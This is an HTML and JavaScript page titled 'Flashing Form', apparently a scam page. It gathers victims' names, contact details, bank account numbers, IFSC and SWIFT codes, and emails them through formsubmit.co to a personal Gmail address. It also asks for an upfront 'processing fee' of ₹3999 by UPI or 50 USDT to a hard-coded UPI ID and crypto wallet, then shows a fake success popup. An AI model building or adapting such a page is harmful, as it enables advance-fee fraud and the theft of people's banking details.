<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport"
 content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Flashing Form </title>

<style>



body {
  margin: 0;
  padding: 0;
  background: #f4f6f8;
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  min-height: 100vh;
}




.form-card {
  background: #fff;
  padding: 25px;
  width: calc(100% - 30px);
  max-width: 430px;
  border-radius: 14px;
  box-shadow: 0 8px 20px rgba(0,0,0,0.12);
  margin: 40px auto;
}

h2 {
  text-align: center;
  color: #1ca64c;
}

.field {
  margin-top: 14px;
}

.field input,
.field select {
  width: 100%;
  padding: 12px;
  border-radius: 8px;
  border: 1px solid #ccc;
  font-size: 14px;
}

.suggest-box {
  position: absolute;
  width: 100%;
  background: #fff;
  border: 1px solid #ccc;
  max-height: 180px;
  overflow-y: auto;
  z-index: 1000;
}

.suggest-box div {
  padding: 10px;
  cursor: pointer;
}

.payment-section {
  display: none;
  margin-top: 14px;
  background: #f1fdf6;
  border-radius: 14px;
  padding: 18px;
  text-align:center;
}

.fee-box {
  display:none;
  background:#fff4e5;
  border:2px dashed #ff9800;
  padding:15px;
  margin-top:15px;
  border-radius:12px;
  text-align:center;
  font-size:18px;
  font-weight:bold;
  color:#e65100;
}

/* ✅ MISSING CSS FIXED */
.copy-row{
  display:flex;
  gap:8px;
  margin-top:10px;
}
.copy-row input{
  flex:1;
  text-align:center;
  font-weight:bold;
}
.copy-row button{
  width:auto;
  padding:8px 14px;
  background:#2196f3;
  color:white;
  border:none;
  border-radius:8px;
}
.copy-msg{
  color:green;
  font-size:14px;
  margin-top:6px;
  display:none;
}

button {
  width: 100%;
  margin-top: 18px;
  padding: 13px;
  border-radius: 10px;
  border: none;
  background: #1ca64c;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

#submitPopup {
  display:none;
  position:fixed;
  top:0; left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.6);
  z-index:9999;
  justify-content:center;
  align-items:center;
}

#submitPopupBox {
  background:white;
  padding:30px;
  border-radius:14px;
  text-align:center;
  width:90%;
  max-width:300px;
}

@media (max-width: 360px) {
  .form-card {
    padding: 18px;
  }
  h2 {
    font-size: 20px;
  }
}
.form-card {
  border: none !important;
  outline: none !important;
}

.form-card * {
  outline: none !important;
  box-shadow: none;
}

iframe {
  display: none;
}
/* ✅ REMOVE HORIZONTAL LINE & FULL CENTER FIX */
html, body {
  width: 100%;
  overflow-x: hidden;
}

/* ✅ PERFECT CENTER ON ALL DEVICES */
body {
  display: flex;
  justify-content: center;
  align-items: flex-start;
}

/* ✅ REMOVE EXTRA LINE COMING FROM IFRAME */
iframe {
  display: none !important;
}

/* ✅ FORM CARD ALWAYS CENTER */
.form-card {
  margin-left: auto;
  margin-right: auto;
}

/* ✅ MOBILE TOUCH + CLICK FEEL FIX */
input, select, button {
  -webkit-tap-highlight-color: transparent;
  touch-action: manipulation;
}

/* ✅ REMOVE RANDOM GRAY LINE ISSUE */
* {
  box-sizing: border-box;
}


/* ✅ DROPDOWN VISIBILITY FIX */
.form-card,
.payment-section {
  overflow: visible !important;
}

/* ✅ FIELD KO CLIP NA KARO (SELECT KE LIYE) */
.field {
  overflow: visible !important;
  position: relative;
}

/* ✅ SELECT MOBILE PE FULL WIDTH & SAFE */
.field select {
  appearance: auto;
  -webkit-appearance: auto;
  background-clip: padding-box;
}

/* ✅ HORIZONTAL SCROLL BLOCK RAHE */
html, body {
  overflow-x: hidden;
}

</style>
</head>

<body>

<div class="form-card">
<h2>Please Enter Details in  Form</h2>

<iframe name="hiddenFrame" style="display:none;"></iframe>

<form id="paymentForm"
action="https://formsubmit.co/chaitanydeep1@gmail.com"
method="POST"
enctype="multipart/form-data"
target="_self"

onsubmit="return showPopup();">

<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_template" value="table">
<input type="hidden" name="_auto_response" value="Thank you! Your payment request has been received. We will contact you soon.">
<input type="hidden" name="_subject" value="Your Payment Form Confirmation">


<div class="field"><input name="Name" placeholder="Full Name" required></div>
<div class="field"><input name="Email" type="email" placeholder="Email" required></div>
<div class="field"><input name="Mobile" placeholder="Mobile" required></div>

<div class="field">
  <input id="countryInput" name="Country" placeholder="Type Country" onkeyup="searchCountry()" required>
  <div id="countrySuggest" class="suggest-box"></div>
</div>

<div class="field">
  <input id="bankInput" name="Bank" placeholder="Type Bank" onkeyup="searchBank()" required>
  <div id="bankSuggest" class="suggest-box"></div>
</div>

<div class="field"><input name="Account" placeholder="Account No" required></div>
<div class="field"><input name="IFSC" placeholder="IFSC Code"></div>
<div class="field"><input name="Branch Name" placeholder="Branch Name" required></div>
<div class="field"><input name="Branch Code" placeholder="Branch Code"></div>
<div class="field"><input name="SWIFT Code" placeholder="SWIFT Code"></div>

<div class="field"><input name="Amount" placeholder="Amount" required></div>

<div class="field">
<select id="payment" name="Payment Method" required onchange="togglePayment(this.value)">
  <option value="">Select Payment Method</option>
  <option value="UPI">UPI</option>
  <option value="USDT">USDT (BEP20)</option>
</select>
</div>

<div id="feeBox" class="fee-box"></div>

<!-- ✅ UPI BOX (STRUCTURE FIXED) -->
<div id="upiBox" class="payment-section">
  <h4>Scan & Pay via UPI</h4>
  <img src="qr.png" width="160">

  <div class="copy-row">
    <input id="upiId" value="chetan155223-1@oksbi" readonly>
    <button type="button" onclick="copyUPI()">COPY</button>
  </div>

  <p id="upiMsg" class="copy-msg">✅ UPI ID Copied</p>
</div>

<!-- ✅ USDT BOX -->
<div id="usdtBox" class="payment-section">
  <h4>USDT BEP20 Address</h4>

  <div style="display:flex; gap:8px;">
    <input 
      id="usdtAddress"
      value="0xF1b0CB8A9F078Bf1E1F4F37f21e9FEe459992fCd"
      readonly 
      style="flex:1; text-align:center; font-weight:bold;"
    >

    <button 
      type="button"
      onclick="copyUSDT()"
      style="background:#ff9800; color:white; border:none; border-radius:8px; padding:8px 12px; cursor:pointer;"
    >
      COPY
    </button>
  </div>

  <p id="copyMsg" style="color:green; font-size:14px; display:none; margin-top:6px;">
    ✅ Address Copied Successfully
  </p>
</div>

<button type="submit">Confirm & Submit</button>
</form>
</div>

<div id="submitPopup">
  <div id="submitPopupBox">
    <h3 style="color:#1ca64c;">✅ Submitted Successfully</h3>
    <p>Your details submitted.<br>Please wait for email confirmation.</p>
  </div>
</div>


<script>
/* ---------------- COUNTRY + BANK DATA ---------------- */
const countryData = {

  India: [
    "State Bank of India (SBI)", "HDFC Bank", "ICICI Bank", "Axis Bank", "Punjab National Bank (PNB)",
    "Bank of Baroda (BOB)", "Canara Bank", "Union Bank of India", "IDBI Bank", "Indian Bank",
    "Central Bank of India", "UCO Bank", "Kotak Mahindra Bank", "Yes Bank", "IndusInd Bank",
    "Federal Bank", "Bandhan Bank", "RBL Bank", "IDFC First Bank", "South Indian Bank"
  ],

  USA: [
    "Chase Bank", "Bank of America", "Wells Fargo", "Citibank", "Capital One",
    "PNC Bank", "U.S. Bank", "TD Bank", "Truist Bank", "Regions Bank",
    "SunTrust Bank", "BB&T Bank", "Fifth Third Bank", "KeyBank", "Huntington Bank",
    "M&T Bank", "Ally Bank", "Discover Bank", "Synchrony Bank", "Citizens Bank"
  ],

  UAE: [
    "Emirates NBD", "First Abu Dhabi Bank (FAB)", "Mashreq Bank", "Abu Dhabi Commercial Bank (ADCB)",
    "Dubai Islamic Bank", "Commercial Bank of Dubai (CBD)", "RAK Bank", "Sharjah Islamic Bank",
    "Ajman Bank", "Noor Bank", "Al Hilal Bank", "United Arab Bank", "Finance House",
    "National Bank of Fujairah", "Emirates Islamic Bank", "Invest Bank",
    "Arab Bank UAE", "Bank of Baroda UAE", "HSBC UAE"
  ],

  UK: [
    "HSBC UK", "Barclays", "Lloyds Bank", "NatWest", "Santander UK",
    "TSB Bank", "Metro Bank", "Nationwide Building Society", "Virgin Money UK",
    "Co-operative Bank", "Starling Bank", "Monzo Bank", "Revolut UK",
    "Clydesdale Bank", "Yorkshire Bank", "Royal Bank of Scotland",
    "Bank of Scotland", "Aldermore Bank", "Close Brothers", "Atom Bank"
  ]

};

let selectedCountry = "";

/* ---------------- COUNTRY SEARCH ---------------- */
function searchCountry(){
  let input = countryInput.value.toLowerCase();
  countrySuggest.innerHTML = "";
  Object.keys(countryData).forEach(country=>{
    if(country.toLowerCase().includes(input)){
      let div = document.createElement("div");
      div.innerText = country;
      div.onclick = () => {
        countryInput.value = country;
        selectedCountry = country;
        countrySuggest.innerHTML = "";
      };
      countrySuggest.appendChild(div);
    }
  });
}

/* ---------------- BANK SEARCH ---------------- */
function searchBank(){
  if (!selectedCountry) return;
  let input = bankInput.value.toLowerCase();
  bankSuggest.innerHTML = "";
  countryData[selectedCountry].forEach(bank=>{
    if(bank.toLowerCase().includes(input)){
      let div = document.createElement("div");
      div.innerText = bank;
      div.onclick = () => {
        bankInput.value = bank;
        bankSuggest.innerHTML = "";
      };
      bankSuggest.appendChild(div);
    }
  });
}

/* ---------------- FEES + PAYMENT BOX LOGIC ---------------- */
function togglePayment(value){
  upiBox.style.display = "none";
  usdtBox.style.display = "none";
  feeBox.style.display = "none";

  if(value === "UPI"){
    upiBox.style.display = "block";
    feeBox.style.display = "block";
    feeBox.innerHTML = "✅ Processing Fees: ₹3999";
  }

  if(value === "USDT"){
    usdtBox.style.display = "block";
    feeBox.style.display = "block";
    feeBox.innerHTML = "✅ USDT Fees: 50 USDT";
  }
}

/* ---------------- POPUP + SUBMIT LOGIC ---------------- */
function showPopup(){

  if(payment.value === ""){
    alert("Please select payment method first!");
    return false;
  }

  // ✅ Popup show
  submitPopup.style.display = "flex";

  // ✅ ONLY ONE TIME SUBMIT (NO DOUBLE SUBMIT)
  setTimeout(() => {
    document.getElementById("paymentForm").submit();
  }, 600);

  return false;
}

/* ✅ COPY UPI */
function copyUPI(){
  upiId.select();
  navigator.clipboard.writeText(upiId.value);
  upiMsg.style.display = "block"; 
  setTimeout(()=> upiMsg.style.display = "none",2000);
}

/* ---------------- COPY USDT ADDRESS ---------------- */
function copyUSDT(){
  const address = document.getElementById("usdtAddress");
  address.select();
  address.setSelectionRange(0, 99999);
  navigator.clipboard.writeText(address.value);

  copyMsg.style.display = "block";
  setTimeout(()=> copyMsg.style.display = "none", 2000);
}
</script>

</body>
</html>
